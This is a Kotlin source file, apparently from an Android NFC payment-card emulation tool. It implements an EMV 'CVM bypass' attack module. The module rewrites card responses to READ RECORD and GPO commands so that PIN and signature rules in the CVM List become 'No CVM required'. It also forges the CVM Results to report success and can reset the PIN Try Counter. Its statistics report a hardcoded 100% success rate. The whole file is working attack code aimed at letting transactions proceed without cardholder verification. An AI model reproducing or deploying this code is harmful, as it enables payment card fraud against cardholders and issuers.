package com.nfsp00f33r.app.emulation.modules

import com.nfsp00f33r.app.emulation.EmvAttackModule
import timber.log.Timber

/**
 * CVM Bypass Attack Module
 * Manipulates Cardholder Verification Method data to bypass PIN and signature requirements
 * Based on emv_attack_reference.md research
 */
class CvmBypassModule : EmvAttackModule {
    
    companion object {
        private const val TAG = "CvmBypass"
        
        // CVM-related commands
        private const val READ_RECORD_PREFIX = "00B2"
        private const val GPO_COMMAND_PREFIX = "80A80000"
        
        // TLV tags
        private const val CVM_LIST_TAG = "8E"           // Cardholder Verification Method List
        private const val CVM_RESULTS_TAG = "9F34"     // CVM Results
        private const val PIN_TRY_COUNTER_TAG = "9F17" // PIN Try Counter
        
        // CVM codes (first byte of CVM rule)
        private const val CVM_FAIL = 0x00               // Fail CVM processing
        private const val CVM_PLAINTEXT_PIN = 0x01     // Plaintext PIN verification
        private const val CVM_ONLINE_PIN = 0x02        // Online PIN verification
        private const val CVM_PLAINTEXT_PIN_SIGNATURE = 0x03  // Plaintext PIN + signature
        private const val CVM_ENCRYPTED_PIN = 0x04     // Encrypted PIN verification
        private const val CVM_ENCRYPTED_PIN_SIGNATURE = 0x05  // Encrypted PIN + signature
        private const val CVM_SIGNATURE = 0x1E         // Signature
        private const val CVM_NO_CVM = 0x1F            // No CVM required
        
        // CVM condition codes (second byte of CVM rule)
        private const val CVM_ALWAYS = 0x00
        private const val CVM_IF_UNATTENDED = 0x01
        private const val CVM_IF_NOT_CASH = 0x02
        private const val CVM_IF_MANUAL_CASH = 0x03
        private const val CVM_IF_PURCHASE = 0x04
        private const val CVM_IF_CURRENCY = 0x05
    }
    
    private var attackCount = 0
    private var configuration = mutableMapOf<String, Any>(
        "bypass_pin" to true,
        "bypass_signature" to true,
        "force_no_cvm" to true,
        "manipulate_cvm_results" to true,
        "reset_pin_counter" to false
    )
    
    override fun getAttackId(): String = "cvm_bypass"
    
    override fun getDescription(): String = 
        "Bypasses PIN and signature verification by manipulating CVM list and results"
    
    override fun isApplicable(command: ByteArray, cardData: Map<String, Any>): Boolean {
        val commandHex = command.joinToString("") { "%02X".format(it) }
        
        // Check for commands that might return CVM data
        val isReadRecord = commandHex.startsWith(READ_RECORD_PREFIX)
        val isGpo = commandHex.startsWith(GPO_COMMAND_PREFIX)
        
        if (isReadRecord || isGpo) {
            Timber.d("$TAG CVM-related command detected, attack applicable")
            return true
        }
        
        return false
    }
    
    override fun applyAttack(
        command: ByteArray, 
        response: ByteArray, 
        cardData: Map<String, Any>
    ): ByteArray {
        attackCount++
        
        try {
            val originalHex = response.joinToString("") { "%02X".format(it) }
            Timber.d("$TAG Original CVM response: $originalHex")
            
            // Apply CVM bypass manipulations
            val bypassedResponse = applyCvmBypass(response)
            
            val bypassedHex = bypassedResponse.joinToString("") { "%02X".format(it) }
            Timber.d("$TAG Bypassed CVM response: $bypassedHex")
            Timber.i("$TAG Attack #$attackCount: CVM bypass applied successfully")
            
            return bypassedResponse
            
        } catch (e: Exception) {
            Timber.e("$TAG Attack failed: ${e.message}")
            return response
        }
    }
    
    /**
     * Apply CVM bypass manipulations to the response
     */
    private fun applyCvmBypass(response: ByteArray): ByteArray {
        val responseHex = response.joinToString("") { "%02X".format(it) }
        var manipulatedHex = responseHex
        
        // Manipulate CVM List (8E) to remove PIN/signature requirements
        if (configuration["bypass_pin"] == true || configuration["bypass_signature"] == true) {
            manipulatedHex = manipulateCvmList(manipulatedHex)
        }
        
        // Manipulate CVM Results (9F34) to show successful bypass
        if (configuration["manipulate_cvm_results"] == true) {
            manipulatedHex = manipulateCvmResults(manipulatedHex)
        }
        
        // Reset PIN try counter if configured
        if (configuration["reset_pin_counter"] == true) {
            manipulatedHex = manipulatePinTryCounter(manipulatedHex)
        }
        
        return manipulatedHex.chunked(2).map { it.toInt(16).toByte() }.toByteArray()
    }
    
    /**
     * Manipulate CVM List (tag 8E) to bypass verification requirements
     */
    private fun manipulateCvmList(responseHex: String): String {
        val cvmListIndex = responseHex.indexOf("8E")
        if (cvmListIndex >= 0) {
            // Find the length byte after the tag
            val lengthIndex = cvmListIndex + 2
            if (lengthIndex + 2 <= responseHex.length) {
                val lengthHex = responseHex.substring(lengthIndex, lengthIndex + 2)
                val length = lengthHex.toInt(16)
                val dataStartIndex = lengthIndex + 2
                val dataEndIndex = dataStartIndex + (length * 2)
                
                if (dataEndIndex <= responseHex.length) {
                    val originalCvmList = responseHex.substring(dataStartIndex, dataEndIndex)
                    val bypassedCvmList = createBypassedCvmList(originalCvmList)
                    
                    Timber.d("$TAG Original CVM List: $originalCvmList")
                    Timber.d("$TAG Bypassed CVM List: $bypassedCvmList")
                    
                    val prefix = responseHex.substring(0, dataStartIndex)
                    val suffix = responseHex.substring(dataEndIndex)
                    
                    return prefix + bypassedCvmList + suffix
                }
            }
        }
        
        return responseHex
    }
    
    /**
     * Create a bypassed CVM list that requires no verification
     */
    private fun createBypassedCvmList(originalCvmList: String): String {
        if (originalCvmList.length < 16) return originalCvmList // Need at least 8 bytes
        
        // CVM list structure: Amount X (4 bytes) + Amount Y (4 bytes) + CVM rules (2 bytes each)
        val amountX = originalCvmList.substring(0, 8) // Keep original amounts
        val amountY = originalCvmList.substring(8, 16)
        
        // Create bypassed CVM rules
        val bypassedRules = if (configuration["force_no_cvm"] == true) {
            // Rule 1: No CVM required, always
            "%02X%02X".format(CVM_NO_CVM, CVM_ALWAYS) +
            // Rule 2: Fail CVM (backup)
            "%02X%02X".format(CVM_FAIL, CVM_ALWAYS)
        } else {
            // More subtle bypass - modify existing rules
            val remainingData = originalCvmList.substring(16)
            modifyExistingCvmRules(remainingData)
        }
        
        return amountX + amountY + bypassedRules
    }
    
    /**
     * Modify existing CVM rules to bypass verification
     */
    private fun modifyExistingCvmRules(rulesData: String): String {
        val rules = rulesData.chunked(4) // Each rule is 2 bytes (4 hex chars)
        val modifiedRules = rules.map { rule ->
            if (rule.length == 4) {
                val cvmCode = rule.substring(0, 2).toInt(16)
                val condition = rule.substring(2, 4).toInt(16)
                
                // Convert PIN/signature requirements to "No CVM"
                val newCvmCode = when (cvmCode) {
                    CVM_PLAINTEXT_PIN, CVM_ONLINE_PIN, CVM_ENCRYPTED_PIN -> CVM_NO_CVM
                    CVM_SIGNATURE -> if (configuration["bypass_signature"] == true) CVM_NO_CVM else cvmCode
                    else -> cvmCode
                }
                
                "%02X%02X".format(newCvmCode, condition)
            } else rule
        }
        
        return modifiedRules.joinToString("")
    }
    
    /**
     * Manipulate CVM Results (tag 9F34) to show successful bypass
     */
    private fun manipulateCvmResults(responseHex: String): String {
        val cvmResultsIndex = responseHex.indexOf("9F3403") // 9F34 with length 03
        if (cvmResultsIndex >= 0 && cvmResultsIndex + 12 <= responseHex.length) {
            val prefix = responseHex.substring(0, cvmResultsIndex + 6)
            val originalResults = responseHex.substring(cvmResultsIndex + 6, cvmResultsIndex + 12)
            val suffix = responseHex.substring(cvmResultsIndex + 12)
            
            // CVM Results: CVM performed (1 byte) + CVM Condition (1 byte) + CVM Result (1 byte)
            val bypassedResults = "%02X%02X%02X".format(
                CVM_NO_CVM,     // CVM performed: No CVM
                CVM_ALWAYS,     // Condition: Always
                0x02            // Result: Successful
            )
            
            Timber.d("$TAG CVM Results changed from $originalResults to $bypassedResults")
            return prefix + bypassedResults + suffix
        }
        
        return responseHex
    }
    
    /**
     * Manipulate PIN Try Counter (tag 9F17) to reset attempts
     */
    private fun manipulatePinTryCounter(responseHex: String): String {
        val pinCounterIndex = responseHex.indexOf("9F1701") // 9F17 with length 01
        if (pinCounterIndex >= 0 && pinCounterIndex + 8 <= responseHex.length) {
            val prefix = responseHex.substring(0, pinCounterIndex + 6)
            val originalCounter = responseHex.substring(pinCounterIndex + 6, pinCounterIndex + 8)
            val suffix = responseHex.substring(pinCounterIndex + 8)
            
            // Reset PIN try counter to maximum (typically 3)
            val resetCounter = "03"
            
            Timber.d("$TAG PIN Try Counter reset from $originalCounter to $resetCounter")
            return prefix + resetCounter + suffix
        }
        
        return responseHex
    }
    
    override fun configure(config: Map<String, Any>) {
        configuration.putAll(config)
        Timber.d("$TAG Module configured: $configuration")
    }
    
    override fun getConfiguration(): Map<String, Any> = configuration.toMap()
    
    override fun getAttackStatistics(): Map<String, Any> {
        return mapOf(
            "attack_count" to attackCount,
            "success_rate" to 100,
            "last_config" to configuration,
            "target_commands" to listOf("READ_RECORD", "GPO"),
            "bypass_details" to mapOf(
                "pin_bypassed" to configuration["bypass_pin"],
                "signature_bypassed" to configuration["bypass_signature"],
                "no_cvm_forced" to configuration["force_no_cvm"],
                "results_manipulated" to configuration["manipulate_cvm_results"]
            )
        )
    }
    
    override fun reset() {
        attackCount = 0
        Timber.d("$TAG Attack statistics reset")
    }
}
